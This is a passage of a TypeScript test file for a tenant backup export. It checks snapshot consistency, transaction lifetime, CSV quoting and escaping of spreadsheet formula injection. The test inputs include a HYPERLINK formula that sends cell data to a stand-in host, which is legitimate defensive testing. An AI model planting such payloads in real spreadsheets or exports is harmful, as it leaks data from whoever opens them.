                    await inject(repositoryTokenFor(TenantTask)).create({ title: 'written meanwhile', projectId: project.id });
                });
                written = true;
            };

            const folder: FsPath = await exportAndUnpack('json-lines');

            expect(written).toBe(true);
            expect(await FsUtilities.readFile(FsUtilities.getPath(folder, file(TenantProject, 'jsonl')))).not.toContain('written meanwhile');
            expect(await FsUtilities.readFile(FsUtilities.getPath(folder, file(TenantTask, 'jsonl')))).not.toContain('written meanwhile');
        }, 30000);

        // every entity is staged before the archive is packed, and a download that stalled held the moment
        // the data source was read as of until it was read to its end
        it('ends its read of the data source before the archive is read, so that a reader taking its time holds none open', async () => {
            const exportTenant: BackupServiceInterface['exportTenant'] = getBackupService().exportTenant;
            assert(exportTenant, 'the backup service exports no tenant');
            const dataSource: TenantBackupDataSource = inject(TenantBackupDataSource);
            const startedBefore: number = dataSource.startedAsOfOneMoment.length;

            const archive: Readable = await exportTenant.call(getBackupService(), tenantA, 'json-lines');
            // the first piece only, with the rest of the archive still to be packed
            const pieces: AsyncIterator<unknown> = archive[Symbol.asyncIterator]();
            await pieces.next();

            const started: Transaction[] = dataSource.startedAsOfOneMoment.slice(startedBefore);
            expect(started).toHaveLength(1);
            expect(started.map(t => t.isFinished)).toStrictEqual([true]);
            await pieces.return?.();
        }, 30000);

        it('writes the rows as CSV with a header row, quoting what needs it', async () => {
            const folder: FsPath = await exportAndUnpack('csv');

            const csv: string = await FsUtilities.readFile(FsUtilities.getPath(folder, file(TenantProject, 'csv')));
            const [header, row] = csv.split('\r\n');
            const columns: string[] = header?.split(',') ?? [];
            expect(columns).toContain('name');
            expect(columns).toContain('secret');
            expect(row).toContain('"Website, ""new"""');
            expect(csv).toContain('"decrypted\nacross lines"');
        }, 30000);

        // whatever a user of the tenant wrote ran as a formula in the spreadsheet of whoever opened the export
        it('writes text a spreadsheet would run as a formula starting with a quote, a number as it is, and every value as it is in JSON', async () => {
            const titles: string[] = ['=HYPERLINK("https://example.com/?"&A2,"open")', '+49 30 1234', '@SUM(A1)', '-12.5', 'plain'];
            const tasks: Repository<TenantTask> = inject(repositoryTokenFor(TenantTask));
            await asTenant(tenantA, async () => await tasks.createAll(titles.map(title => ({ title, projectId: UUIDUtilities.generate() }))));
            try {
                const csv: string = await FsUtilities.readFile(FsUtilities.getPath(await exportAndUnpack('csv'), file(TenantTask, 'csv')));
                const jsonLines: string = await FsUtilities.readFile(FsUtilities.getPath(await exportAndUnpack('json-lines'), file(TenantTask, 'jsonl')));

                expect(csv).toContain('"\'=HYPERLINK(""https://example.com/?""&A2,""open"")"');
                expect(csv).toContain('\'+49 30 1234');
                expect(csv).toContain('\'@SUM(A1)');
                expect(csv).toContain('-12.5');
                expect(csv).not.toContain('\'-12.5');
                expect(csv).not.toContain('\'plain');
                const written: string[] = jsonLines.split('\n').filter(l => l.length)
                    .map(l => JsonUtilities.parse<{ title: string }>(l).title);
                expect(written).toEqual(expect.arrayContaining(titles));
            }
            finally {
                await asTenant(tenantA, async () => await tasks.deleteAll({ title: { oneOf: titles } }));
            }
        }, 30000);
    });
});